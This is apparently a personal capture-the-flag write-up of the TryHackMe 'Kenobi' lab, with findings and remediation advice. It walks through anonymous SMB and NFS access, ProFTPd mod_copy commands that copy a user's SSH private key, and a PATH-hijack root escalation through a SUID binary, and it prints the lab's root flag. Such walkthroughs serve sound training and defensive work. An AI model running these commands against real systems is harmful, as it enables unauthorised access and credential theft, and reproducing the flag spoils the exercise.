# Kenobi — TryHackMe — Easy — Network

**Date Completed:** 25 Sep 2026
**Time to Root:** ~2 hours
**User Flag:** `kenobi (SSH access via stolen private key)`
**Root Flag:** `177b3cd8562289f37382721c28381f02`

---

## Executive Summary

Kenobi is a multi-stage Linux machine chaining together three separate misconfigurations: an anonymously-readable SMB share leaking a configuration log, a vulnerable ProFTPd module allowing unauthenticated server-side file copying, and a SUID binary vulnerable to PATH hijacking. Individually each issue is moderate; chained together they allow a fully unauthenticated attacker to reach root.

---

## Scope and Methodology

- **Target IP:** 10.80.157.183
- **Platform:** TryHackMe
- **Category:** Network
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -p- -T4 10.80.157.183 -oN kenobi-nmap.txt
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | ProFTPD 1.3.5 | Vulnerable to mod_copy CVE, entry point |
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) | Used post-exploitation with stolen key |
| 80 | HTTP | Apache 2.4.41 | `/admin.html` disallowed in robots.txt, not needed for this chain |
| 111 | rpcbind | — | Supports NFS |
| 139/445 | SMB | Samba smbd 4 | Anonymous share, initial info leak |
| 2049 | NFS | — | `/var` exported, used to retrieve the stolen key |

---

## Enumeration

### SMB

Listed available shares and connected anonymously:
```bash
smbclient -L //10.80.157.183 -N
smbclient //10.80.157.183/anonymous -N
```

Downloaded `log.txt` from the anonymous share, which contained:
- Confirmation that user `kenobi`'s SSH key lives at `/home/kenobi/.ssh/id_rsa`
- The full ProFTPd configuration (confirming ProFTPd runs as user `kenobi`)
- The Samba configuration itself, confirming the `[anonymous]` share maps to `/home/kenobi/share`

### NFS

```bash
showmount -e 10.80.157.183
sudo mkdir /mnt/kenobiNFS
sudo mount 10.80.157.183:/var /mnt/kenobiNFS
```

The target exports `/var` with no access restriction, giving direct filesystem read access to anything written there — including `/var/tmp`, which becomes relevant in the next stage.

---

## Exploitation

**Vulnerability Class:** Unauthenticated Remote File Copy via ProFTPd mod_copy (no assigned CVE identifier in this instance, related to the well-known 2015 ProFTPd 1.3.5 mod_copy disclosure)

Confirmed the vulnerable module was present:
```bash
searchsploit proftpd 1.3.5
```

Connected directly to the FTP service and issued mod_copy's `SITE CPFR`/`SITE CPTO` commands — no authentication required:
```bash
nc 10.80.157.183 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Server response confirmed the copy:

350 File or directory exists, ready for destination name
250 Copy successful


Retrieved the stolen private key through the NFS mount established earlier:
```bash
cp /mnt/kenobiNFS/tmp/id_rsa ~/kenobi_id_rsa
chmod 600 ~/kenobi_id_rsa
```

Authenticated via SSH using the stolen key:
```bash
ssh -i ~/kenobi_id_rsa kenobi@10.80.157.183
```

This granted a fully interactive shell as user `kenobi` with no credentials ever having been guessed, brute-forced, or otherwise directly obtained — the entire access chain relied purely on service misconfiguration.

---

## Privilege Escalation

Enumerated SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/menu` stood out as a non-standard SUID-root binary. Inspecting it with `strings` revealed it internally calls `curl -I localhost`, `uname -r`, and `ifconfig` — none referenced by full path, meaning the binary relies on the `PATH` environment variable to resolve them at runtime.

Since the binary is SUID-root, hijacking one of these unqualified command names lets an attacker's own binary execute with root privileges:

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Selecting menu option 1 ("status check") triggered the internal `curl -I localhost` call, which resolved to the malicious `/tmp/curl` (spawning `/bin/sh`) instead of the real binary — running as root due to the SUID bit, dropping directly into a root shell.

Note: partway through this stage the TryHackMe lab machine auto-restarted due to session timeout, invalidating the active SSH session and NFS mount. Reconnecting with the previously-retrieved SSH key succeeded without needing to repeat the SMB/NFS/ProFTPd chain, confirming the underlying VM instance persisted through the restart.

---

## Proof of Completion

177b3cd8562289f37382721c28381f02


---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| Anonymous SMB share exposing sensitive configuration data | Medium | 5.3 | T1135 | CWE-200 |
| ProFTPd mod_copy unauthenticated file copy | High | 7.5 | T1005 | CWE-862 |
| SUID binary with unqualified command execution (PATH hijack) | Critical | 8.8 | T1548.001 / T1574.007 | CWE-426 |

---

## Remediation

1. **Anonymous SMB Share:** Remove anonymous/guest access to SMB shares entirely, or at minimum ensure no sensitive files (configs, logs, key material references) are ever placed in a world-readable share.
2. **ProFTPd mod_copy:** Upgrade ProFTPd to a patched version, or disable the mod_copy module if server-side file copying is not a required feature.
3. **SUID PATH Injection:** Never call external commands without a fully-qualified path (`/usr/bin/curl` instead of `curl`) inside a SUID binary. Where possible, avoid granting SUID to custom-written binaries altogether — use `sudo` with a tightly scoped command allow-list instead.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| smbclient | Anonymous SMB share enumeration and file retrieval |
| showmount / mount | NFS share discovery and mounting |
| searchsploit | Confirming known ProFTPd 1.3.5 vulnerabilities |
| netcat | Manual FTP protocol interaction (mod_copy exploitation) |
| OpenSSH | Authenticated access using the stolen private key |

---

## Lessons Learned

- A misconfigured SMB share doesn't need to expose credentials directly to be dangerous — a leaked configuration log revealing file paths and running users was enough to build a full attack chain.
- Mounting an exported NFS share gives a completely separate, unauthenticated view into parts of a target's filesystem — useful as a "dead drop" to retrieve files written by an otherwise-unrelated exploit (in this case, ProFTPd's file copy).
- Lab machines can restart mid-engagement due to inactivity/session timeouts. It's worth keeping stolen credentials (like the SSH key here) saved locally rather than only relying on an active session, since reconnecting with saved material can save having to redo an entire multi-stage chain.
